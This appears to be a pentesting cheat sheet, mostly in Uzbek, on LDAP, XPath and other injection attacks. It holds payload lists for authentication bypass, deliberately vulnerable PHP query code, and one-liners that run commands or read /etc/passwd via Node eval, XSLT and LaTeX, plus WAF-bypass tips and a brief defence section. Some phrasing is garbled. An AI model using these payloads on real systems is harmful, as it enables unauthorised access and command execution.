# LDAP / XPath / Other Injection (injection-extra)

## 1. LDAP Injection

### Ta'rif
LDAP directory'ga query so'rovida foydalanuvchi input sanitizatsiyasiz → filter bypass, anonymous access.

### Payloads
```
user=*)(uid=*))(|(uid=*&pass=*
user=admin)(|(password=*)&pass=*
*)(|(password=*
user=*&pass=*
admin: *)
(uid=*)
(|(uid=*))
&(uid=*))(& uid=*
```
Examples:
```
GET /search?user=*)(uid=*))(|(uid=* HTTP/1.1
# Filter: (&(user=*)(uid=*))(|(uid=*)(pass=*))
```
### Zaif code
```php
// ZAIF
$filter = "(&(uid=" . $_GET['uid'] . ")(userPassword=" . $_GET['pw'] . "))";
$r = ldap_search($ds, "ou=users", $filter);
```
### Notes
- `*` wildcard — hech narsasiz nazorat
- Blind LDAP: boolean/time-based ping o'xshash
- Values caracter encod (null, Ò), filter escape: `\2a` `\28` uchun

## 2. XPath Injection

### Ta'rif
XML xpath query foydalanuvchi input bilan: `//user[name='INPUT' and pass='...']`.

### Payloads
```
' or '1'='1
' or '1'='1' or '1'='1
x' or 1=1 and ''='
'] | //*[contains(.,'x
or 1=1
" or "1"="1
' or ''='
```
### Zaif code
```php
$xp = "//user[name='" . $_GET['name'] . "' and pass='" . $_GET['pass'] . "']";
$res = $xpath->query($xp);
```
### Notes
- Boolean/time bymun (count function)
- XPath 2.0: substring/string-length blind xato
- **Hayotiy tavsiya:** XML'da hech qachon string concat' bilan query qurma!

## 3. SSTI-esque / other injection lar
- **XSLT injection**: `xsl` fayllar userdan — `<xsl:value-of select="system('id')"/>`
- **Cron / eval / include** —
- **CRLF injection** (header): `%0d%0a` header'da Set-Cookie / Location
- **Email/SMTP header injection**: `x@y.com%0aBcc: victim@...`
- **Server-Side JS injection** (Node):  `eval(req.body)` — `process.mainModule.require('child_process').execSync('id')`
- **Latex injection**: `\input{/etc/passwd}`, `\immediate\write18{id}` (pdflatex shell escape)
- **Expression Language (Java EL)**: `${7*7}` in spring error pages
- **CSS injection**: exfil via `@import url(...)` (limératif)

## 4. Barcha injection lar uchun metodologiya
1. Input qanday syntaxtisga tushadi — debug/hata yordamida.
2. `'` `"` `)` `*` `[` 'qidiring — syntax break.
3. True/false farq — boolean, time — time-based.
4. Error'lar verbose bo'lsa — structure leak.
5. WAF dan bypass: case, encoding, `\`, `%00`.

## 5. Umumiy himoya
- Typed/parameterized queries (LDAP filter escape, XPath parametr)
- Sanitize/whitelist, error detail (generic)
- `allow_url_*` ko'p', least privilege DB/DS query user